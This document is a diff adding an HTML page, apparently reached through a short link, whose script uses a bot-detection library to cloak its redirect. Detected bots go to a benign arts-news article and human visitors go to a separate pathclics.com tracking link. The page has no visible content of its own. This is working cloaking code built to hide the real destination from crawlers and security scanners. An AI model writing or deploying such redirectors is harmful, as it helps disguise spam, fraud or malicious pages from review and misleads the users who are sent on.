@@ -1,0 +1,50 @@
+<!-- url: https://is.gd/88xv6r
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <script type="text/javascript">
+        // Set url
+        var url_bot = 'https://coloradosound.org/the-weekly-mixdown-arts-and-music-news/';
+        var url_user = 'https://www2.pathclics.com/s/42cf1c2250951';
+        // Initialize an agent at application startup, once per page/app.
+        const botdPromise = import('https://openfpcdn.io/botd/v1').then((Botd) => Botd.load());
+        // Check promise
+        botdPromise
+            .then((botd) => botd.detect())
+            .then((result) => {
+                // console.log(result.bot)
+                if (result.bot) {
+                    // console.log(true);
+                    var meta = document.createElement('meta');
+                    meta.httpEquiv = "refresh";
+                    meta.content = "1;url="+url_bot+"";
+                    document.getElementsByTagName('head')[0].appendChild(meta);
+                } else {
+                    // console.log(false);
+                    var meta = document.createElement('meta');
+                    meta.httpEquiv = "refresh";
+                    meta.content = "1;url="+url_user+"";
+                    document.getElementsByTagName('head')[0].appendChild(meta);
+
+                }
+            })
+        .catch((error) => console.error(error))
+    </script>
+    <style>
+        /* Background style */
+        body {
+            background-color: #ffffff; /* Soft blue background color */
+        }
+        /* Text style */
+        h1 {
+            text-align: center;
+            padding: 100px;
+            font-size: 24px;
+        }
+    </style>
+</head>
+    <body><h1></h1></body>
+</html>
